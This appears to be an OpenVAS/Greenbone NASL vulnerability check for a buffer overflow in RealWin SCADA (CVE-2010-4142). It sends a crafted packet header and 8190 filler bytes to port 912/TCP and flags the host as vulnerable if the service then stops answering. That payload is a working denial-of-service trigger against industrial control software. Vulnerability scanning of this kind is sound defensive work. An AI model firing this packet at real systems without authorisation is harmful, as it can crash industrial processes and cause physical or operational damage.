# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801622");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2010-11-02 18:01:36 +0100 (Tue, 02 Nov 2010)");
  script_cve_id("CVE-2010-4142");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("RealWin SCADA System <= 2.1 Build 6.1.10.10 Multiple Buffer Overflow Vulnerabilities");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(912);

  script_xref(name:"URL", value:"http://secunia.com/advisories/41849");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/44150");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15259/");
  script_xref(name:"URL", value:"http://downloads.securityfocus.com/vulnerabilities/exploits/44150-1.rb");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute
  arbitrary code on the system or cause a denial of service condition.");

  script_tag(name:"affected", value:"RealWin SCADA System 2.0 Build 6.1.8.10 and prior.");

  script_tag(name:"insight", value:"The flaws are due to a boundary error when processing
  'SCPC_INITIALIZE', 'SCPC_INITIALIZE_RF' and 'SCPC_TXTEVENT' packets that can be exploited to cause
  a stack-based buffer overflow by sending specially crafted packets to port 912/TCP.");

  script_tag(name:"solution", value:"Update to version 2.1 Build 6.1.10.10 or later.");

  script_tag(name:"summary", value:"RealWin SCADA system is prone to multiple buffer overflow
  vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

port = 912;
if(!get_port_state(port))
  exit(0);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

head = raw_string(0x64, 0x12, 0x54, 0x6A, 0x20, 0x00, 0x00, 0x00,
                  0xF4, 0x1F, 0x00, 0x00);

junk = crap(data:"a", length:8190);
junk += raw_string(0x00);

send(socket:soc, data:head + junk);
close(soc);

sleep(5);

soc = open_sock_tcp(port);
if(!soc){
  security_message(port:port);
}

exit(0);
